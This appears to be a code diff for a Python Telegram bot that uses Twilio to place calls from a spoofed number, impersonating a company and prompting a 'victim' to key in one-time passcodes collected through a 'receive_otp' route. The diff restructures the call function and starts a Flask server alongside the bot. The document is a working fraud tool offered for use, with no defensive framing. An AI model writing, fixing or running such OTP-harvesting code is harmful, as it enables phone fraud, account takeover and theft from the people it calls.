@@ -73,20 +73,6 @@ def receive_otp():
 
 # Asynchronous function for initiating a call
 async def async_initiate_call(victim_number, prompt, spoof_number, company_name, language="en"):
-    loop = asyncio.get_event_loop()
-    with ThreadPoolExecutor() as executor:
-        await loop.run_in_executor(
-            executor,
-            initiate_call,
-            victim_number,
-            prompt,
-            spoof_number,
-            company_name,
-            language
-        )
-
-# Modify the initiate_call function to use Twilio's Gather verb
-def initiate_call(victim_number, prompt, spoof_number, company_name, language="en"):
     try:
         client = Client(config["TWILIO_SID"], config["TWILIO_AUTH_TOKEN"])
         voice_response = VoiceResponse()
@@ -158,15 +144,14 @@ def start_bot():
     application.add_handler(CommandHandler("custom", custom_command))
     application.run_polling()
 
-# Interactive menu to configure the script
-def interactive_menu():
-    global config
-    while True:
-        print("\nInteractive Configuration Menu")
-        # (Menu implementation here...)
-
-# Initialize configuration
+# Load the configuration
 config = load_config()
 
-# Start the script
-interactive_menu()
+# Start the bot and Flask application in separate threads
+if __name__ == "__main__":
+    # Start Flask app in a separate thread
+    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000)).start()
+
+    # Start the Telegram bot
+    start_bot()
+
